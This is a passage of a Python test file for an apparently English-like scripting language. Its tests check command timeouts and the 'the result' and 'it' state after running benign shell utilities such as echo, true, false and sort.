    run('try to run "sleep" with "30" within 200 milliseconds')
    _time.sleep(0.3)
    after = subprocess.run(["pgrep", "-c", "sleep"], capture_output=True,
                           text=True).stdout.strip() or "0"
    assert int(after) <= int(before), "a timed-out sleep is still running"


# ------------------------------------------------ `the result` and `it` state
#
# `the result` mirrors $? : it always reflects the LAST command, so a success
# after a failure resets it, and a failure after a success sets it. `it` holds
# the last command's stdout and is never a stale value from an earlier one.

@needs_coreutils
def test_result_reflects_each_command_in_turn():
    src = '''
    try to run "false"
    put the result
    try to run "true"
    put the result
    '''
    assert out(src) == "1\n0"


@needs_coreutils
def test_a_success_clears_an_earlier_failures_status():
    src = '''
    try to run "false"
    run "true"
    put the result
    '''
    assert out(src) == "0"


@needs_coreutils
def test_a_failure_sets_status_after_an_earlier_success():
    src = '''
    run "true"
    try to run "false"
    put the result
    '''
    assert out(src) == "1"


@needs_coreutils
def test_it_is_replaced_not_appended():
    src = '''
    run "echo" with "first"
    run "echo" with "second"
    put it
    '''
    assert out(src) == "second"


@needs_coreutils
def test_it_becomes_empty_when_a_command_emits_nothing():
    # `it` must not leak the previous command's output.
    src = '''
    run "echo" with "leftover"
    run "true"
    put "[" & it & "]"
    '''
    assert out(src) == "[]"


@needs_coreutils
def test_a_pipe_updates_both_it_and_result():
    src = '''
    run "echo" with "stale"
    pipe
        run "printf" with "b\\na\\nc\\n"
        run "sort"
    end pipe
    put it
    put the result
    '''
    assert out(src) == "a\nb\nc\n0"


@needs_coreutils
def test_result_survives_reads_without_changing():
    # Reading `the result` must not itself alter it.
    src = '''
    try to run "false"
    put the result
    put the result
    '''
    assert out(src) == "1\n1"
